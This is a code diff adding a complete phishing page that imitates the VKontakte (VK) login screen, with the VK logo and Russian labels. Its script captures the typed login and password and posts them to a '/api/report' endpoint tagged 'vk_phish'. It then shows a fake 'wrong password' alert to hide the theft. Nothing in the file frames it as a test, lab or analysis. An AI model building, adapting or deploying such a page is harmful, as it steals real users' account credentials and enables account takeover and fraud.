@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ВКонтакте</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #edeef0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { text-align: center; max-width: 350px; width: 100%; padding: 20px; background: #fff; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .logo { width: 60px; margin-bottom: 20px; }
+        h2 { font-size: 20px; margin-bottom: 15px; }
+        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 15px; }
+        button { width: 100%; padding: 12px; background-color: #0077FF; color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: 500; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/2/21/VK.com_logo.svg" alt="VK">
+        <h2>Вход ВКонтакте</h2>
+        <input type="text" id="login" placeholder="Номер телефона или email" />
+        <input type="password" id="password" placeholder="Пароль" />
+        <button onclick="sendData()">Войти</button>
+    </div>
+    <script>
+        function sendData() {
+            const l = document.getElementById('login').value;
+            const p = document.getElementById('password').value;
+            if(!l || !p) return;
+            fetch('/api/report', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id: 'vk_phish', kind: 'vk_login', body: 'Логин: ' + l + '\nПароль: ' + p })
+            }).then(() => {
+                alert('Неверный пароль. Попробуйте снова.');
+            });
+        }
+    </script>
+</body>
+</html>
